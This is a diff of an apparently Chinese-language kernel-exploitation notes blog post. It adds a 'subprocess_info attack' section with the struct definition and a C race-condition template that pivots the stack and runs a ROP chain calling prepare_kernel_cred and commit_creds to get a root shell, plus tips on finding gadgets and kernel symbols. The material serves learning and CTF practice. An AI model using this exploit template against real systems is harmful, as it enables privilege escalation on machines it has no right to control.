@@ -29,7 +29,7 @@
 <meta property="og:description" content="ret2usr核心：利用 commit_creds(prepare_kernel_cred(0)) 进行提取 原理：该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred 当已知 commit_creds 和 prepare_kernel_cred 的函数地址时，用如下代码进行提权： 123456void get_root(">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-05-20T17:37:34.000Z">
-<meta property="article:modified_time" content="2022-05-27T07:12:06.476Z">
+<meta property="article:modified_time" content="2022-06-22T05:30:41.584Z">
 <meta property="article:author" content="yhellow">
 <meta property="article:tag" content="kernel">
 <meta property="article:tag" content="ret2usr">
@@ -193,7 +193,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-05-27 15:12:06" itemprop="dateModified" datetime="2022-05-27T15:12:06+08:00">2022-05-27</time>
+                <time title="Modified: 2022-06-22 13:30:41" itemprop="dateModified" datetime="2022-06-22T13:30:41+08:00">2022-06-22</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -217,13 +217,13 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>7.8k</span>
+              <span>9.7k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>7 mins.</span>
+              <span>9 mins.</span>
             </span>
 
         </div>
@@ -288,6 +288,18 @@
 <li>offset 和 len 都是4字节数据，如果把它们拼在一起，凑成8字节，就是 0x10000000000</li>
 <li>如果我们用 UAF，使其 pipe_buffer 和另一个结构体重合，那么该结构体对应位置也会变为 0x10000000000</li>
 <li>如果该结构体与内存管理有关，并且该位表示 size 的话，就可以造成堆溢出 </li>
+</ul>
+<h2 id="subprocess-info-attack"><a href="#subprocess-info-attack" class="headerlink" title="subprocess_info attack"></a>subprocess_info attack</h2><p>使用以下语句：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<p>会触发 <code>struct subprocess_info</code> 这个对象的分配，此结构为0x60大小，定义如下： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">char</span> **argv;</span><br><span class="line">    <span class="keyword">char</span> **envp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">int</span> wait;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
+<p>此对象在分配时最终会调用 cleanup 函数，如果我们能在分配过程中把 cleanup 指针劫持为我们的 gadget，就能控制RIP，劫持的方法显而易见，即条件竞争</p>
+<p>模板：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">race</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)arg;</span><br><span class="line">  info[<span class="number">0</span>] = (<span class="keyword">u_int64_t</span>)xchg_eax_esp; </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)xchg_eax_esp &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] hijacked_stack: %p\n&quot;</span>, (<span class="keyword">char</span> *)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* fake_stack = <span class="literal">NULL</span>; </span><br><span class="line">  <span class="keyword">if</span>((fake_stack = mmap((<span class="keyword">char</span>*)((hijacked_stack_addr &amp; (~<span class="number">0xfff</span>))),<span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>)) == MAP_FAILED)</span><br><span class="line">      perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_stack addr: %p\n&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">  fake_stack[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">  <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = pop_rdi;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = prepare_kernel_cred;</span><br><span class="line">  hijacked_stack_ptr[index++] = mov_rdi_rax_je_pop_pop_ret;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = commit_creds;</span><br><span class="line">  hijacked_stack_ptr[index++] = swapgs;</span><br><span class="line">  hijacked_stack_ptr[index++] = iretq;</span><br><span class="line">  hijacked_stack_ptr[index++] = (<span class="keyword">u_int64_t</span>)getshell;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_cs;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_rflags;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_rsp;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_ss;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    write(fd, (<span class="keyword">void</span>*)info,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (race_flag) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这些 gadget 都可以通过 <code>ropper</code> 来找</li>
+<li>commit_creds，prepare_kernel_cred 可以通过 <code>grep &lt;symbol_name&gt; /proc/kallsyms</code> 来找（记得开 root，关闭 kernel ASLR）</li>
+<li>而 user_cs 这些寄存器的值，可以通过 <code>save_status</code> 来获取</li>
 </ul>
 
     </div>
@@ -374,7 +386,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2usr"><span class="nav-number">1.</span> <span class="nav-text">ret2usr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tty-struct-attack"><span class="nav-number">2.</span> <span class="nav-text">tty_struct attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">3.</span> <span class="nav-text">条件竞争</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-trick"><span class="nav-number">4.</span> <span class="nav-text">pipe trick</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2usr"><span class="nav-number">1.</span> <span class="nav-text">ret2usr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tty-struct-attack"><span class="nav-number">2.</span> <span class="nav-text">tty_struct attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">3.</span> <span class="nav-text">条件竞争</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-trick"><span class="nav-number">4.</span> <span class="nav-text">pipe trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#subprocess-info-attack"><span class="nav-number">5.</span> <span class="nav-text">subprocess_info attack</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -390,7 +402,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">114</span>
+          <span class="site-state-item-count">115</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -403,7 +415,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-count">80</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -444,7 +456,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">23:01</span>
+    <span title="Reading time total">23:16</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
